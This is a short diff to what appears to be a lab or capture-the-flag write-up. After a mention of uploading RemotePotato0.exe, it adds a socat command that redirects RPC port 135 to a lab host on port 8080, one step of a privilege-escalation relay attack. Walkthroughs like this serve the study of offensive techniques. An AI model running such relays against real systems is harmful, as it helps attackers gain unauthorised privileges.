@@ -385,6 +385,12 @@ RemotePotato0.exe                                                               
 This uploaded the remotepotato
 
 ```python
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8080
+[sudo] password for kali: 
+```
+Started a socat listener
+
+```python
 
 ```
 
